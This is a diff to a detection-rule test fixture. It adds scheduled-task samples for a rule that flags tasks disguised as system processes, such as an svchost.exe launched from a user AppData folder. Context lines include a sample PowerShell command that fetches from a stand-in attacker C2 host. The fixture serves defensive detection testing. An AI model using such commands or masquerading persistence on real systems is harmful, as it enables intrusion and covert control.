@@ -97,9 +97,20 @@ FIXTURE = [
     ("psc2_neg_notps", "evtx",  # cmdlet + reserved TLD but not the PowerShell channel
      {"Channel": "Security", "EventId": "4688",
       "ScriptBlockText": "Invoke-WebRequest http://evil-c2.attacker.test/x"}),
+    # --- scheduled task whose action masquerades as a system process ---
+    ("taskmasq_pos", "scheduled_tasks",
+     {"task_name": "Microsoft/Windows/SystemMaintenance/UpdateCheck", "run_as": "u",
+      "actions": [{"type": "Exec", "command": r"C:\Users\u\AppData\Roaming\sysupdate\svchost.exe"}]}),
+    ("taskmasq_neg_legit", "scheduled_tasks",  # system proc name but from System32 (legit)
+     {"task_name": "Microsoft/Windows/Autochk/Proxy",
+      "actions": [{"type": "Exec", "command": r"%windir%\system32\rundll32.exe"}]}),
+    ("taskmasq_neg_nonsysproc", "scheduled_tasks",  # user-writable path but not a system-proc name
+     {"task_name": "MyApp/Update",
+      "actions": [{"type": "Exec", "command": r"C:\Users\u\AppData\Local\MyApp\update.exe"}]}),
 ]
 
 EXPECTED = {
+    "tlvb-scheduled-task-system-process-masquerade": {"taskmasq_pos"},
     "tlvb-powershell-c2-reserved-tld": {"psc2_pos"},
     "tlvb-exec-from-world-writable-path": {"exec_pos_public"},
     "tlvb-ransomware-locked-mass-rename": {"locked_pos_rename", "locked_pos_note"},
